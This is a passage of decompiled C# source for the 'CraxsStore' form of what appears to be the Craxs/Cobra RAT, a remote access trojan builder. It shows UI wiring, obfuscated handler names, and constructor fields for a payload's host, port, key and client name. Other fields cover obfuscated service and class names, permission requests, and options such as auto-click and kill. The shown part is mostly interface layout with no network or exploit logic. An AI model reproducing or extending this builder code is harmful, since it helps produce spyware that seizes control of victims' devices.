			DoWorkEventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsascewfvwgfgh;
			BackgroundWorker backgroundWorker = _loadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_loadworker = value;
			backgroundWorker = _loadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panelhome")]
	internal virtual Panel Panelhome
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon exitbtn
	{
		[CompilerGenerated]
		get
		{
			return _exitbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Exitbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _exitbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_exitbtn = value;
			drakeUIButtonIcon = _exitbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("reqbtn")]
	internal virtual DrakeUIButtonIcon reqbtn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon storebtn
	{
		[CompilerGenerated]
		get
		{
			return _storebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Storebtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _storebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_storebtn = value;
			drakeUIButtonIcon = _storebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolTips")]
	internal virtual DrakeUIToolTip ToolTips
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ImageList1")]
	internal virtual ImageList ImageList1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker downloadworker
	{
		[CompilerGenerated]
		get
		{
			return _downloadworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj;
			BackgroundWorker backgroundWorker = _downloadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_downloadworker = value;
			backgroundWorker = _downloadworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("downprogress")]
	internal virtual DrakeUIProcessBar downprogress
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("workpanel")]
	internal virtual Panel workpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("workimage")]
	internal virtual DrakeUIImageButton workimage
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("worklabel")]
	internal virtual Label worklabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("worklog")]
	internal virtual DrakeUITextBox worklog
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lockpanel")]
	internal virtual Panel lockpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label15")]
	internal virtual Label Label15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label13")]
	internal virtual Label Label13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("strpasstext")]
	internal virtual DrakeUITextBox strpasstext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label17")]
	internal virtual Label Label17
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon b_ok
	{
		[CompilerGenerated]
		get
		{
			return _b_ok;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b_ok_click;
			DrakeUIButtonIcon drakeUIButtonIcon = _b_ok;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_b_ok = value;
			drakeUIButtonIcon = _b_ok;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon3 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar showworkbtn
	{
		[CompilerGenerated]
		get
		{
			return _showworkbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Showworkbtn_Click;
			DrakeUIAvatar drakeUIAvatar = _showworkbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_showworkbtn = value;
			drakeUIAvatar = _showworkbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ComboPrims")]
	public virtual ComboBox ComboPrims
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon4 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("TabPage4")]
	internal virtual TabPage TabPage4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwefghcvbeefrw;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatswefzxcuyhg;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon5 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label16")]
	internal virtual Label Label16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("iconprim")]
	internal virtual DataGridViewImageColumn iconprim
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("primname")]
	internal virtual DataGridViewTextBoxColumn primname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("sizeapp")]
	internal virtual DataGridViewTextBoxColumn sizeapp
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("verapp")]
	internal virtual DataGridViewTextBoxColumn verapp
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Status")]
	internal virtual DataGridViewTextBoxColumn Status
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("apdate")]
	internal virtual DataGridViewTextBoxColumn apdate
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("sel")]
	internal virtual DataGridViewCheckBoxColumn sel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkkill")]
	internal virtual DrakeUICheckBox checkkill
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkDraw")]
	internal virtual DrakeUICheckBox checkDraw
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkautoclick")]
	internal virtual DrakeUICheckBox checkautoclick
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checksuper")]
	internal virtual DrakeUICheckBox checksuper
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public CraxsStore()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatstughes;
		loadingtext = "Welcome to Cobra Rat Store...   ";
		conecttext = "Loading...";
		stage1 = false;
		stage2 = false;
		loadsuccess = false;
		loadfaild = false;
		need_write = false;
		need_read = false;
		need_forground = false;
		need_syswinow = false;
		need_boot = false;
		need_all = false;
		ASKPRIM_all = false;
		N__ask_prim_ = "AbddSfsvasDFBetgrnsrtnatrhjryghwrtgafsgfjbrTHAERgvergesrg";
		N__access_ask_ = "AbddSfsxasDFBetgrnsrteatrhjryghwrtjafsgfjbrTlAERevergesrg";
		N_newEngineWorkerins = "AbddSfsvasDFBetgrnsrtnatrhjxyghwftgafsgxjbrTHAERdvergesrg";
		N__srv_worker_ = "AbddSfsvasDFBetgrusrtuatfhjryghwstgafsgfjbrTHAERgvergesrg";
		N_cap_sc_ = "AbddSfsvasDFBetgsnsrtnxtrhjryghwstgafsgsfjbrTHAERgvergesrg";
		N_update_app_ = "AbddSfsvassDFBetzrnsrtnatrhjrcymhwrtgafsgfjbrmHAEugvergesrg";
		N_WackMeUpJob = "AbddSfsvasDtBetgrnvsrtnatrhjsryghwrtgafsgfjsbrTHAERgvergesrg";
		N_ClassGen = "AbddSfsvasDFvBetgrnsrtnavtrhjryghwrtgafssgfjbrTHuqAERbgvergesrg";
		N__ask_draw_ = "";
		N__ask_battary_ = "";
		N__CamActivity_ = "";
		N__SCRActivity_ = "";
		N__webviewer_ = "";
		N__scctrl_ = "AbddSfsvasDFvBetgrnsrtnavtrhjryghwrtgafssgfjbrTHuqAERbgvergesrg";
		newgetbyts = "";
		newsrvrun = "";
		split1 = "";
		split2 = "";
		split3 = "";
		split4 = "";
		newhost = "";
		newport = "";
		newkey = "";
		newalive = "";
		newname = "";
		neweco = "";
		newconect = "";
		newsokt = "";
		newstrtconct = "";
		newcnl = "";
		newcnm = "";
		newsndmthd = "";
		newforuce = "";
		newplgs = "";
		NEWRANDOM = "";
		cou = 1;
		cou3 = 1;
		ALLPRIMSLIST = new List<string>();
		TK = "BSN12345678901234567";
		appnamebuild = "";
		FolderApk = false;
		StartedZip = false;
		rshit = null;
		oncedelete = true;
		_Time = 10;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.CraxsStore));
		this.logopic = new System.Windows.Forms.PictureBox();
		this.statustext = new System.Windows.Forms.Label();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.mainpanel = new System.Windows.Forms.Panel();
		this.DrakeUITabControl1 = new DrakeUI.Framework.DrakeUITabControl();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.showworkbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.DGVSTORE = new System.Windows.Forms.DataGridView();
		this.iconprim = new System.Windows.Forms.DataGridViewImageColumn();
		this.primname = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.sizeapp = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.verapp = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Status = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.apdate = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.sel = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.checkkill = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkDraw = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkautoclick = new DrakeUI.Framework.DrakeUICheckBox();
		this.checksuper = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label9 = new System.Windows.Forms.Label();
		this.Label14 = new System.Windows.Forms.Label();
		this.ComboPrims = new System.Windows.Forms.ComboBox();
		this.Label8 = new System.Windows.Forms.Label();
		this.Label6 = new System.Windows.Forms.Label();
		this.Label5 = new System.Windows.Forms.Label();
		this.DrakeUIAvatar5 = new DrakeUI.Framework.DrakeUIAvatar();
		this.Label12 = new System.Windows.Forms.Label();
		this.Label11 = new System.Windows.Forms.Label();
		this.msgtext = new DrakeUI.Framework.DrakeUITextBox();
		this.Label10 = new System.Windows.Forms.Label();
		this.titletext = new DrakeUI.Framework.DrakeUITextBox();
		this.Label2 = new System.Windows.Forms.Label();
		this.Label3 = new System.Windows.Forms.Label();
		this.Label7 = new System.Windows.Forms.Label();
		this.Label4 = new System.Windows.Forms.Label();
		this.Host = new DrakeUI.Framework.DrakeUITextBox();
		this.TheKey = new DrakeUI.Framework.DrakeUITextBox();
		this.Port = new DrakeUI.Framework.DrakeUITextBox();
		this.CLiname = new DrakeUI.Framework.DrakeUITextBox();
		this.TabPage4 = new System.Windows.Forms.TabPage();
		this.workpanel = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.worklabel = new System.Windows.Forms.Label();
		this.worklog = new DrakeUI.Framework.DrakeUITextBox();
		this.workimage = new DrakeUI.Framework.DrakeUIImageButton();
		this.downprogress = new DrakeUI.Framework.DrakeUIProcessBar();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Label1 = new System.Windows.Forms.Label();
		this.DrakeUIImageButton1 = new DrakeUI.Framework.DrakeUIImageButton();
		this.DrakeUIButtonIcon13 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon12 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.loadworker = new System.ComponentModel.BackgroundWorker();
		this.Panelhome = new System.Windows.Forms.Panel();
		this.exitbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.reqbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.storebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.ToolTips = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.DrakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
		this.downloadworker = new System.ComponentModel.BackgroundWorker();
		this.lockpanel = new System.Windows.Forms.Panel();
		this.Label16 = new System.Windows.Forms.Label();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.strpasstext = new DrakeUI.Framework.DrakeUITextBox();
		this.b_ok = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon5 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Label13 = new System.Windows.Forms.Label();
		this.Label17 = new System.Windows.Forms.Label();
		this.Label15 = new System.Windows.Forms.Label();
		((System.ComponentModel.ISupportInitialize)this.logopic).BeginInit();
		this.mainpanel.SuspendLayout();
		this.DrakeUITabControl1.SuspendLayout();
		this.TabPage2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVSTORE).BeginInit();
		this.TabPage1.SuspendLayout();
		this.TabPage4.SuspendLayout();
		this.workpanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.workimage).BeginInit();
		this.Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DrakeUIImageButton1).BeginInit();
		this.Panelhome.SuspendLayout();
		this.lockpanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.Panel3.SuspendLayout();
		base.SuspendLayout();
		this.logopic.Dock = System.Windows.Forms.DockStyle.Top;
		this.logopic.Image = Craxs_Rat.My.Resources.Resources.sstore;
		this.logopic.Location = new System.Drawing.Point(0, 0);
		this.logopic.Name = "logopic";
		this.logopic.Size = new System.Drawing.Size(1184, 558);
		this.logopic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
		this.logopic.TabIndex = 0;
		this.logopic.TabStop = false;
		this.statustext.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.statustext.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.statustext.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.statustext.Location = new System.Drawing.Point(0, 780);
		this.statustext.Name = "statustext";
		this.statustext.Size = new System.Drawing.Size(1184, 23);
		this.statustext.TabIndex = 1;
		this.statustext.Text = "...";
		this.statustext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.mainpanel.Controls.Add(this.DrakeUITabControl1);
		this.mainpanel.Controls.Add(this.Panel1);
		this.mainpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mainpanel.Location = new System.Drawing.Point(0, 0);
		this.mainpanel.Name = "mainpanel";
		this.mainpanel.Size = new System.Drawing.Size(1184, 780);
		this.mainpanel.TabIndex = 2;
		this.DrakeUITabControl1.Controls.Add(this.TabPage2);
		this.DrakeUITabControl1.Controls.Add(this.TabPage1);
		this.DrakeUITabControl1.Controls.Add(this.TabPage4);
		this.DrakeUITabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUITabControl1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
		this.DrakeUITabControl1.FillColor = System.Drawing.Color.Black;
		this.DrakeUITabControl1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUITabControl1.ItemSize = new System.Drawing.Size(388, 40);
		this.DrakeUITabControl1.Location = new System.Drawing.Point(0, 56);
		this.DrakeUITabControl1.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
		this.DrakeUITabControl1.Name = "DrakeUITabControl1";
		this.DrakeUITabControl1.RightToLeft = System.Windows.Forms.RightToLeft.No;
		this.DrakeUITabControl1.SelectedIndex = 0;
		this.DrakeUITabControl1.Size = new System.Drawing.Size(1184, 724);
		this.DrakeUITabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.DrakeUITabControl1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUITabControl1.StyleCustomMode = true;
		this.DrakeUITabControl1.TabBackColor = System.Drawing.Color.Black;
		this.DrakeUITabControl1.TabIndex = 35;
		this.DrakeUITabControl1.TabSelectedColor = System.Drawing.Color.Black;
		this.DrakeUITabControl1.TabSelectedForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUITabControl1.TabSelectedHighColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUITabControl1.TabUnSelectedForeColor = System.Drawing.Color.FromArgb(240, 240, 240);
		this.TabPage2.BackColor = System.Drawing.Color.Black;
		this.TabPage2.Controls.Add(this.showworkbtn);
		this.TabPage2.Controls.Add(this.DGVSTORE);
		this.TabPage2.Location = new System.Drawing.Point(0, 40);
		this.TabPage2.Name = "TabPage2";
		this.TabPage2.Size = new System.Drawing.Size(1184, 684);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = "Store";
		this.showworkbtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.showworkbtn.AvatarSize = 45;
		this.showworkbtn.BackColor = System.Drawing.Color.Transparent;
		this.showworkbtn.FillColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.showworkbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.showworkbtn.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.showworkbtn.Location = new System.Drawing.Point(1146, 658);
		this.showworkbtn.Name = "showworkbtn";
		this.showworkbtn.Size = new System.Drawing.Size(25, 23);
		this.showworkbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.showworkbtn.Symbol = 61777;
		this.showworkbtn.SymbolSize = 25;
		this.showworkbtn.TabIndex = 10;
		this.showworkbtn.Text = "DrakeUIAvatar1";
		this.ToolTips.SetToolTip(this.showworkbtn, "Downloading");
		this.showworkbtn.Visible = false;
		this.DGVSTORE.AllowUserToAddRows = false;
		this.DGVSTORE.AllowUserToDeleteRows = false;
		this.DGVSTORE.AllowUserToResizeColumns = false;
		this.DGVSTORE.AllowUserToResizeRows = false;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Black;
		this.DGVSTORE.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGVSTORE.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVSTORE.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVSTORE.BackgroundColor = System.Drawing.Color.Black;
		this.DGVSTORE.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGVSTORE.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVSTORE.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGVSTORE.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVSTORE.ColumnHeadersVisible = false;
		this.DGVSTORE.Columns.AddRange(this.iconprim, this.primname, this.sizeapp, this.verapp, this.Status, this.apdate, this.sel);
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVSTORE.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGVSTORE.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVSTORE.EnableHeadersVisualStyles = false;
		this.DGVSTORE.GridColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DGVSTORE.Location = new System.Drawing.Point(0, 0);
		this.DGVSTORE.MultiSelect = false;
		this.DGVSTORE.Name = "DGVSTORE";
		this.DGVSTORE.ReadOnly = true;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVSTORE.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGVSTORE.RowHeadersVisible = false;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.Black;
		this.DGVSTORE.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGVSTORE.RowTemplate.Height = 24;
		this.DGVSTORE.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVSTORE.ShowCellErrors = false;
		this.DGVSTORE.ShowEditingIcon = false;
		this.DGVSTORE.ShowRowErrors = false;
		this.DGVSTORE.Size = new System.Drawing.Size(1184, 684);
		this.DGVSTORE.TabIndex = 1;
		this.iconprim.FillWeight = 65f;
		this.iconprim.HeaderText = " ";
		this.iconprim.Name = "iconprim";
		this.iconprim.ReadOnly = true;
		this.primname.FillWeight = 73.85786f;
		this.primname.HeaderText = "App Name";
		this.primname.Name = "primname";
		this.primname.ReadOnly = true;
		this.sizeapp.HeaderText = "App Size";
		this.sizeapp.Name = "sizeapp";
		this.sizeapp.ReadOnly = true;
		this.verapp.HeaderText = "App Version";
		this.verapp.Name = "verapp";
		this.verapp.ReadOnly = true;
		this.Status.FillWeight = 45f;
		this.Status.HeaderText = "Package";
		this.Status.Name = "Status";
		this.Status.ReadOnly = true;
		this.apdate.HeaderText = "App Date";
		this.apdate.Name = "apdate";
		this.apdate.ReadOnly = true;
		this.sel.HeaderText = "select";
		this.sel.Name = "sel";
		this.sel.ReadOnly = true;
		this.TabPage1.BackColor = System.Drawing.Color.Black;
		this.TabPage1.Controls.Add(this.checkkill);
		this.TabPage1.Controls.Add(this.checkDraw);
		this.TabPage1.Controls.Add(this.checkautoclick);
		this.TabPage1.Controls.Add(this.checksuper);
		this.TabPage1.Controls.Add(this.Label9);
		this.TabPage1.Controls.Add(this.Label14);
		this.TabPage1.Controls.Add(this.ComboPrims);
		this.TabPage1.Controls.Add(this.Label8);
		this.TabPage1.Controls.Add(this.Label6);
		this.TabPage1.Controls.Add(this.Label5);
